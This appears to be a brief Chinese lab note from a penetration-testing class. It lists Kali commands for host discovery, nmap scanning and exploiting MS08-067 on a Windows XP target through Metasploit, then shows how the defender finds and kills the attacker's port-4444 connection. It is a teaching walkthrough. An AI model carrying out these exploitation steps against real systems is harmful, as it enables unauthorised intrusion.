## 實習目標:安全防護、滲透測試(penetration test)
```
[攻]--->[防]

I.攻擊步驟:
 1.掃描確認網段中有哪些電腦開啟
 2.確定攻擊目標作業系統
 3.確認是否有xxx漏洞
 4.exploitation 開始攻擊
 
[防] -->漏洞掃描
    \__>滲透測試
    
II.防禦步驟
 1.確認異常連線 PORT? UDP
 2.找到PID process
 3.殺掉攻擊者連線
```
## 實戰過程
```

I.攻擊
 1.(KALI):ipconfig --> 找到eth0 獲得本機ip
 2.(KALI):netdiscover -r (kali ip)/24 確認目標ip
 3.(KALI):nmap -O (xp id) 收集情資 目標可能的作業系統
    google hacking 找尋相應漏洞
 4.(KALI):nmap --script vuln
 5.(KALI):開啟攻擊模式
 6.(KALI):msfconsole
 7.(KALI):search ms 08-067(漏洞)
   #找CVE漏洞
 8.(KALI):use 複製攻擊碼
 9.(KALI):set RHOSTS ip 確認攻擊路徑
 10.(KALI):show option
 11.(KALI):run  攻擊開始
 12.(KALI):入侵成功 ls dir pwd openvas
II.防禦
 1.(XP):netstat -ano
 2.(XP):taskkill /F pid(攻擊者 4444 port)
 3.(XP):成功殺掉攻擊方連線
 
```
